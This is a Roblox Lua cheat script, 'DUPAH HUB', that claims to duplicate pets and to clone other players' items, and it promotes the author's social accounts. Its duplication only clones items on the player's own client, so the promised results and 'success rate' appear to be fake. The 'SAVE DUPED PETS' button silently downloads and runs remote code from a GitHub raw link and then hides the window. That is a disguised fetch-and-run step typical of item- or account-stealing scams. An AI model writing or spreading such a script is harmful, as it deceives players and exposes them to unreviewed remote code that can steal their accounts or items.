local player = game.Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local PlayerGui = player:WaitForChild("PlayerGui")

-- 1️⃣ LOADING SCREEN (as provided)
-- [Insert your existing loading GUI code here, up to and including loadingGui:Destroy()]

-- 2️⃣ LUNA UI SETUP
local Luna = loadstring(game:HttpGet("https://raw.githubusercontent.com/LunaUI/Luna/master/source.lua"))()
local Window = Luna:Window("DUPAH HUB", "Sub to YUraxYZ", false)

-- Helper: notification
local function notify(title, message)
    Window:Notify({Title = title, Content = message, Duration = 4})
end

-- 📘 DESCRIPTION TAB
local descTab = Window:Tab("Description")
descTab:Label("📌 REMEMBER", "Please read all instructions carefully to avoid issues during the duplication process.")
descTab:Label("Supported Pets", "Queen Bee, Raccoon, Dragonfly, Red Fox")
descTab:Label("Success Rate", "Public servers: ~38% — rejoin & redo if unsuccessful.")
descTab:Label("Duplication Delay", "Wait 3–5 minutes after starting. Rejoin for the results.")
descTab:Label("How to Use", "Equip pet → enter amount → DUPE → SAVE DUPED PETS")
descTab:Label("⚠️ Warning", "Don't leave immediately after DUPE or pets may be lost!")

-- 🎮 MAIN TAB
local mainTab = Window:Tab("Main")
local toolLabel = mainTab:Label("Holding:", "Nothing")

spawn(function()
    while task.wait(0.1) do
        local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
        if tool then
            toolLabel:SetDesc(tool.Name)
        else
            toolLabel:SetDesc("Nothing")
        end
    end
end)

local dupeAmount = 1
mainTab:Textbox("Dupe Amount (1‑20)", "Enter number", function(text)
    local n = tonumber(text)
    if n and n >= 1 and n <= 20 then
        dupeAmount = n
    else
        notify("Invalid", "Please enter 1‑20")
    end
end)

mainTab:Button("DUPE", function()
    local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
    if not tool then return notify("Error","No tool to duplicate!") end
    for i = 1, dupeAmount do
        local clone = tool:Clone()
        clone.Parent = player.Backpack
    end
    notify("Dupe", "Duplicated "..dupeAmount.." tool(s)")
end)

mainTab:Button("SAVE DUPED PETS", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/NotyourScripter/PetxSeedSpawner/refs/heads/main/Lscreen.lua"))()
    end)
    Window:Hide()
end)

-- 🛠️ STEALER TAB (COMING SOON)
local stealerTab = Window:Tab("Stealer (Coming Soon)")
local invLabel = stealerTab:Label("Select a Player", "–")
local playerDropdown
local function updateInventory(plr)
    local inv = {}
    for _,c in ipairs(plr:GetChildren()) do
        if c:IsA("Folder") or c:IsA("Backpack") then
            for _, item in ipairs(c:GetChildren()) do
                table.insert(inv, item.Name.." ("..item.ClassName..")")
            end
        end
    end
    invLabel:SetDesc(#inv > 0 and table.concat(inv,"\n") or "Empty")
end

playerDropdown = stealerTab:Dropdown("Players", function()
    local list = {}
    for _,p in ipairs(game.Players:GetPlayers()) do
        if p ~= player then table.insert(list,p.Name) end
    end
    return list
end, function(name)
    local plr = game.Players:FindFirstChild(name)
    if plr then updateInventory(plr) end
end)

stealerTab:Button("🔄 Refresh", function() playerDropdown:Refresh() end)
stealerTab:Button("🧤 Clone Items", function()
    local sel = game.Players:FindFirstChild(playerDropdown:GetSelected())
    if not sel then return notify("Error", "No / invalid player selected!") end
    local count = 0
    for _,c in ipairs(sel:GetChildren()) do
        if c:IsA("Backpack") or c:IsA("Folder") then
            for _, item in ipairs(c:GetChildren()) do
                local clone = item:Clone()
                clone.Parent = player.Backpack
                count = count + 1
            end
        end
    end
    notify("Clone", "Cloned "..count.." item(s)")
end)

-- 🌐 SOCIAL TAB
local socialTab = Window:Tab("Social")
socialTab:Label("TIKTOK", "SUPPORT MY TIKTOK")
socialTab:Label("MAIN ACCOUNT", "@yurahaxyz | @yurahayz")
socialTab:Label("YOUTUBE", "SUBSCRIBE TO MY CHANNEL")
socialTab:Label("MAIN ACCOUNT", "YUraxYZ")

-- Show the UI
Window:Show()
